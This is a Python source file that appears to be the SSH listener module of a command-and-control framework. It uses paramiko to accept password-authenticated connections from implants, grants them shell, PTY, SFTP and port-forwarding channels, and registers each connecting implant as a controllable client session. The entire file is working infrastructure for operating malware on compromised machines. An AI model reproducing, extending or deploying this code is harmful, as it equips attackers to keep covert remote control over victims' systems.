import paramiko
import socket
import logging
import threading
import os
from typing import Tuple, Callable

from ..session.client_session import ClientSession
from .base_server import BaseServer
from paramiko import SFTPServer, SFTPServerInterface

logger = logging.getLogger('c2.ssh')


class SSHServerInterface(paramiko.ServerInterface):
    """SSH Server Interface implementation"""
    
    def __init__(self, config: dict):
        super().__init__()
        self.config = config
        self.pty_enabled = False
        self.term_settings = None
        self.event = threading.Event()
        self.is_sftp_connection = False

    def check_channel_request(self, kind: str, chanid: int) -> int:
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        if kind == 'forwarded-tcpip':
            self.is_sftp_connection = True  # Mark as SFTP connection
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_port_forward_request(self, addr, port):
        """Handle port forwarding requests from implant"""
        logger.info(f"Port forward request from {addr}:{port}")
        return port  # Allow and return the same port
        
    def check_channel_pty_request(self, channel, term, width, height, width_pixels, height_pixels, modes):
        # Store term settings with correct param names for get_pty()
        self.pty_enabled = True
        self.term_settings = {
            'term': term,
            'width': width,
            'height': height,
            'width_pixels': width_pixels,
            'height_pixels': height_pixels,
            'modes': modes
        }
        logger.info(f"PTY requested: {term} ({width}x{height} chars, {width_pixels}x{height_pixels} pixels)")
        return True

    def check_channel_shell_request(self, channel):
        # Allow shell regardless of PTY negotiation
        logger.info("Shell request accepted")
        return True

    def check_channel_subsystem_request(self, channel: paramiko.Channel, name: str) -> bool:
        if name == 'sftp':
            self.is_sftp_connection = True
            logger.info("SFTP subsystem request accepted")
            return True
        return False
    
    def check_auth_password(self, username, password):
        if (username == self.config['username'] and 
            password == self.config['password']):
            return paramiko.AUTH_SUCCESSFUL
        logger.warning(f"Authentication failed for user: {username}")
        return paramiko.AUTH_FAILED
        
    def get_allowed_auths(self, username):
        return 'password'

class SSHServer(BaseServer):
    """SSH transport implementation for C2 server"""
    
    def __init__(self, config: dict, client_connected_callback: Callable = None):
        super().__init__(config, client_connected_callback)
        self.server_socket = None
        self.host_key = None
        self._load_host_key()


    def _load_host_key(self):
        key_path = self.config['host_key']
        try:
            if not os.path.exists(key_path):
                key = paramiko.RSAKey.generate(2048)
                key.write_private_key_file(key_path)
                self.host_key = key
            else:
                self.host_key = paramiko.RSAKey(filename=key_path)
            logger.info(f"Loaded host key from {key_path}")
        except Exception as e:
            logger.error(f"Failed to load host key: {e}")
            raise
    
    def start(self):
        if self.running:
            logger.warning("SSH server already running")
            return
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.config['bind_address'], self.config['ssh_port']))
            self.server_socket.listen(5)
            self.running = True
            logger.info(f"SSH server listening on {self.config['bind_address']}:{self.config['ssh_port']}")
            threading.Thread(target=self._accept_connections, daemon=True).start()
        except Exception as e:
            logger.error(f"Failed to start SSH server: {e}")
            if self.server_socket:
                self.server_socket.close()
            raise
    
    def stop(self):
        self.running = False
        if self.server_socket:
            self.server_socket.close()
            self.server_socket = None
        logger.info("SSH server stopped")
    
    def _accept_connections(self):
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                threading.Thread(target=self._handle_connection, args=(client_socket, addr), daemon=True).start()
            except OSError:
                break
            except Exception as e:
                logger.error(f"Error in accept loop: {e}")
    
    def _handle_connection(self, client_socket, addr: Tuple[str, int]):
        logger.info(f"New SSH connection from {addr[0]}:{addr[1]}")
        try:
            transport = paramiko.Transport(client_socket)
            transport.add_server_key(self.host_key)
            
            server_interface = SSHServerInterface(self.config)
            transport.start_server(server=server_interface)
            
            channel = transport.accept(20)
            if channel is None:
                logger.error(f"No channel established from {addr}")
                return

            # Don't create a new client session for SFTP connections
            if server_interface.is_sftp_connection or addr[0] == '127.0.0.1':
                    logger.debug("SFTP connection - skipping client session registration")
                    return

            # allocate server-side PTY if requested by client
            if server_interface.pty_enabled and server_interface.term_settings:
                channel.get_pty(**server_interface.term_settings)
                channel.invoke_shell()

            # Receive initial client info banner
            client_info = channel.recv(1024).decode(errors='replace')
            logger.info(f"Client info received: {client_info.strip()}")

            # Create session and register
            client = ClientSession(
                channel=channel,
                client_info=client_info,
                addr=addr,
                config=self.config,
                transport_type='ssh',
                pty_enabled=server_interface.pty_enabled,
                term_settings=server_interface.term_settings
            )
            self.add_client(client)
            # send a space so client knows connection is live
            channel.send(' ')
        except Exception as e:
            logger.error(f"Error handling connection: {e}")
        # do not close socket here; transport closes on disconnect
